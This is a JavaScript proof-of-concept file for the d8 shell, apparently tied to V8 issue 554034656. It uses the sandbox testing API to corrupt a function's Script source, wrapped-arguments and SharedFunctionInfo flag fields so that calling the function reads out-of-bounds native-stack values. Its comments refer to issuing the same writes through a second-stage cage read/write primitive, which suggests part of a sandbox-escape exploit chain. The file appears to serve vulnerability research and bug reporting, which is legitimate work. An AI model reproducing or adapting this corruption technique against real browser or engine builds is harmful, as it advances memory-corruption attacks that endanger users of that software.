'use strict';

// Diagnostic-only probe for issue 554034656. This uses the sandbox testing API
// in the separate sandboxlab build to isolate native-stack geometry before the
// same three 32-bit writes are issued through stage2_cage_rw.js.

const index = Number(arguments[0] || 0);
if (!Number.isInteger(index) || index < 0 || index >= 0x10000) {
  throw new Error('usage: d8 ... poc_issue_554034656.js -- INDEX');
}

const source = 'function victim(){' + ' '.repeat(96) + 'return 0;}';
(0, eval)(source);
const target = globalThis.victim;
const names = Array.from({length: 0x10000}, (_, i) => 'p' + i);
const statement = `return p${index};`;
const replacement =
    (' '.repeat('function victim'.length) + statement).padEnd(source.length, ' ');
if (replacement.length !== source.length) throw new Error('source size mismatch');

const sfi = Sandbox.dereferenceTaggedPointerField(target, 'shared_function_info');
const script = Sandbox.dereferenceTaggedPointerField(sfi, 'script');
const elements = Sandbox.dereferenceTaggedPointerField(names, 'elements');
const offsetOf = (object, field) =>
    Sandbox.getFieldOffset(Sandbox.getInstanceTypeIdOf(object), field);
const sfiFlags = offsetOf(sfi, 'formal_parameter_count') + 6;
const scriptPosition = offsetOf(script, 'wasm_managed_native_module');
const scriptSource = scriptPosition - 36;
const wrappedArguments = scriptPosition - 4;
const oldFlags = Sandbox.readObjectField(sfi, sfiFlags, 32);
const wrappedFlags = ((oldFlags & ~(7 << 7)) | (4 << 7)) >>> 0;
const tagged = object => (Sandbox.getAddressOf(object) + 1) >>> 0;

Sandbox.corruptObjectField(script, scriptSource, tagged(replacement), 32);
Sandbox.corruptObjectField(script, wrappedArguments, tagged(elements), 32);
Sandbox.corruptObjectField(sfi, sfiFlags, wrappedFlags, 32);

const result = target();
print(`index=${index} value=${result}`);

